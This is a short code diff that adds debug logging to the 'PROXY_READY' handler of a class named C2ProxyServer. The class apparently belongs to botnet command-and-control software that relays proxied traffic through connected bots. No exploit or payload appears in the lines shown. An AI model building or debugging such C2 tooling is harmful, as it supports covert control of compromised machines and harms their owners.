@@ -999,15 +999,22 @@ class C2ProxyServer:
                             pass
                         self.cleanup_proxy_connection(cid)
                 elif header.startswith("PROXY_READY:"):
+                    print(f"🔍 C2 received PROXY_READY: {header.strip()}")
                     parts = header.split(":")
                     if len(parts) >= 2:
                         cid = parts[1]
+                        print(f"🔍 Parsed connection ID: {cid}")
                         if cid in self.active_proxy_connections:
                             connection = self.active_proxy_connections[cid]
                             if 'pending_data' in connection:
                                 print(f"📤 Bot ready, sending pending data for {cid}")
                                 self._send_data_frame_to_bot(bot_socket, cid, connection['pending_data'])
                                 del connection['pending_data']
+                            else:
+                                print(f"⚠️  No pending data for connection {cid}")
+                        else:
+                            print(f"⚠️  Connection {cid} not found in active connections")
+                            print(f"   Available connections: {list(self.active_proxy_connections.keys())}")
                 else:
                     # Ignore unknown headers
                     pass
